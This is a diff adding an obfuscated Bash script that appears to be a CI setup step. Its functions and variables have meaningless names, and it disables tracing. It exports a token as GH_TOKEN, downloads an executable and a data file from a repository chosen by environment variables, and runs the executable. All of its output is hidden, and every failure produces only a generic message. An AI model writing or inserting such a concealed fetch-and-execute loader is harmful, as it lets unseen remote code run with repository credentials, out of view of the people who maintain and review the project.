@@ -1,0 +1,85 @@
+#!/usr/bin/env bash
+set -euo pipefail
+set +x
+
+f() {
+  printf '%s\n' "$1" >&2
+  exit 1
+}
+
+s() {
+  local n="$1"
+  if [ "${!n+x}" != "x" ]; then
+    f "setup failed"
+  fi
+}
+
+n() {
+  local n="$1"
+  s "$n"
+  if [ -z "${!n}" ]; then
+    f "setup failed"
+  fi
+}
+
+a() {
+  local q="$1"
+  if [[ ! "$q" =~ ^x_[a-z2-7]{16}$ ]]; then
+    f "setup failed"
+  fi
+}
+
+b() {
+  local q="$1"
+  if [[ ! "$q" =~ ^x_[a-z2-7]{16}(,x_[a-z2-7]{16})*$ ]]; then
+    f "setup failed"
+  fi
+}
+
+n x_6cmbo2bdpq4caynq
+n x_wxu7lqsqjkii2jyc
+n x_dpjm6zoa36df4u3g
+n x_iaffyhnobr2hhry6
+a "${x_iaffyhnobr2hhry6}"
+s x_e32nc5rx56rmofkw
+if [ -n "${x_e32nc5rx56rmofkw:-}" ]; then
+  b "${x_e32nc5rx56rmofkw}"
+fi
+
+d="$(mktemp -d)"
+c() {
+  rm -rf "$d"
+}
+trap c EXIT
+
+t="$d/r"
+l="$d/l"
+o="$d/o"
+mkdir -p "$t"
+
+export GH_TOKEN="${x_dpjm6zoa36df4u3g}"
+r="${x_6cmbo2bdpq4caynq}"
+v="${x_wxu7lqsqjkii2jyc}"
+k="${x_iaffyhnobr2hhry6}"
+
+g() {
+  local p="$1"
+  local q="$2"
+  if ! gh api -H "Accept: application/vnd.github.raw" "repos/${r}/contents/${p}?ref=${v}" >"$q" 2>"$l"; then
+    f "setup failed"
+  fi
+}
+
+g "x/${k}/x" "$t/x"
+g "x/${k}/d" "$t/d"
+chmod 700 "$t/x"
+chmod 600 "$t/d"
+
+export x_kil4hdhgpt3aksx2="$o"
+if ! "$t/x" >"$l" 2>&1; then
+  f "run failed"
+fi
+
+if [ -n "${x_e32nc5rx56rmofkw:-}" ]; then
+  n GITHUB_OUTPUT
+fi
